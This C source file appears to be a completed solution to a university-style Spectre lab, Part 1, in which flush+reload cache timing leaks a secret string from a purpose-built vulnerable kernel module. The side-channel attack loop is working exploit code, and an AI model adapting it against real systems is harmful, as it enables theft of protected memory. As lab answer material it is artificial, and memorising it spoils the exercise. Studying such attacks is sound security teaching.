/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    // Define threshold based on expected cache hit time
    const uint64_t CACHE_HIT_THRESHOLD = 80;

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
        leaked_byte = '?';
        const uint64_t CACHE_HIT_THRESHOLD = 80;
        for (int attempt = 0; attempt < 1000; attempt++) {
            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * 4096]);
            }
            call_kernel_part1(kernel_fd, shared_memory, current_offset);
            for (int i = 0; i < 256; i++) {
                uint64_t access_time = time_access(&shared_memory[i * 4096]);
                if (access_time < CACHE_HIT_THRESHOLD) {
                    leaked_byte = (char)i;
                    break;
                }
            }
            if (leaked_byte != '?') {
                break;
            }
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
